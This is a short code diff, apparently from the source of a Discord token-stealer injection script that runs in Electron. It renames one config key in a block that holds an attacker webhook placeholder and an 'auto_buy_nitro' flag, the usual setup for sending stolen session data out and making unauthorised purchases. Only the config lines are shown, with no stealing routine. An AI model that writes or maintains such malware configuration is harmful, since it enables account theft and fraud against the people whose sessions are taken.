@@ -50,7 +50,7 @@ const {
   session
 } = require("electron");
 const config = {
-  'vare': "vare",
+  'euro': "euro",
   'webhook': "%WEBHOOK%",
   'notify_init': true,
   'auto_buy_nitro': true,
